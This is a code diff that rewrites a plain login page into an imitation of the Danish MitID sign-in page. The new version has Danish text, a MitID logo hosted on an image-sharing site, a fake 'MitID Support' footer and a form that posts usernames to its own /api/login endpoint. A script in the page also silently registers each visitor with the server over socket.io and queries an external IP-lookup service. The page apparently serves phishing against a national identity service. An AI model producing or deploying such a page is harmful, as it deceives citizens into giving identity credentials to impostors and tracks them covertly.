@@ -1,78 +1,109 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html lang="da">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Login - Stream System</title>
-  <script src="/socket.io/socket.io.js"></script>
-  <style>
-    body {
-      font-family: system-ui, sans-serif;
-      background: #f7f7f7;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
-    }
-    form {
-      background: white;
-      padding: 2rem;
-      border-radius: 10px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-      width: 100%;
-      max-width: 320px;
-      text-align: center;
-    }
-    h2 { margin-bottom: 1rem; color: #333; }
-    input {
-      width: 100%;
-      padding: 0.7rem;
-      margin: 0.5rem 0;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      font-size: 1rem;
-    }
-    button {
-      width: 100%;
-      padding: 0.8rem;
-      background: #0078ff;
-      border: none;
-      border-radius: 5px;
-      color: white;
-      font-weight: bold;
-      cursor: pointer;
-    }
-    button:hover { background: #0062cc; }
-  </style>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>MitID - Log på</title>
+<script src="/socket.io/socket.io.js"></script>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background: #f5f5f5;
+  margin: 0;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
+.container {
+  background: white;
+  border-radius: 12px;
+  box-shadow: 0 0 10px rgba(0,0,0,0.1);
+  width: 100%;
+  max-width: 360px;
+  padding: 24px;
+  text-align: center;
+}
+.logo {
+  width: 80px;
+  margin-bottom: 10px;
+}
+h2 {
+  margin: 0;
+  font-size: 1.4rem;
+  color: #333;
+}
+p {
+  color: #555;
+  font-size: 0.9rem;
+}
+input[type="text"] {
+  width: 100%;
+  padding: 10px;
+  border-radius: 5px;
+  border: 1px solid #ccc;
+  font-size: 1rem;
+  margin: 12px 0;
+}
+button {
+  width: 100%;
+  padding: 10px;
+  background: #0066ff;
+  border: none;
+  color: white;
+  font-size: 1rem;
+  font-weight: bold;
+  border-radius: 6px;
+  cursor: pointer;
+}
+button:hover { background: #0053cc; }
+label {
+  font-size: 0.85rem;
+  color: #555;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  margin-top: 8px;
+  cursor: pointer;
+}
+.checkbox {
+  width: 16px;
+  height: 16px;
+}
+.footer {
+  margin-top: 12px;
+  font-size: 0.8rem;
+  color: #888;
+}
+</style>
 </head>
 <body>
-  <form action="/api/login" method="POST">
-    <h2>Login</h2>
-    <input type="text" name="username" placeholder="Enter your name" required />
-    <button type="submit">Continue</button>
-  </form>
+  <div class="container">
+    <img src="https://i.postimg.cc/WzDHPTPX/logo.jpg" alt="MitID logo" class="logo">
+    <h2>MitID Log på</h2>
+    <p>Indtast dit brugernavn for at fortsætte</p>
+    <form action="/api/login" method="POST">
+      <input type="text" name="username" placeholder="Brugernavn" required />
+      <label><input type="checkbox" class="checkbox"> Husk mig hos MitID</label>
+      <button type="submit">Fortsæt</button>
+    </form>
+    <div class="footer">
+      © MitID Support — 2025
+    </div>
+  </div>
 
-  <script>
-    // --- Silent guest registration before login ---
-    const socket = io();
-
-    async function detectIP() {
-      try {
-        // Use a reliable HTTPS endpoint to get public IP (Render-safe)
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        const ip = data.ip || 'Unknown';
-        // Notify server of guest
-        socket.emit('join_guest', 'Unknown');
-      } catch (err) {
-        // Even if IP lookup fails, still register guest
-        socket.emit('join_guest', 'Unknown');
-      }
+<script>
+  // --- Silent guest registration (no UI shown) ---
+  const socket = io();
+  async function registerGuest() {
+    try {
+      await fetch('https://api.ipify.org?format=json'); // triggers external IP request
+      socket.emit('join_guest', 'Unknown'); // only sends to your backend
+    } catch {
+      socket.emit('join_guest', 'Unknown'); // fallback even if API fails
     }
-
-    // Connect and immediately try to register guest
-    socket.on('connect', detectIP);
-  </script>
+  }
+  socket.on('connect', registerGuest);
+</script>
 </body>
 </html>
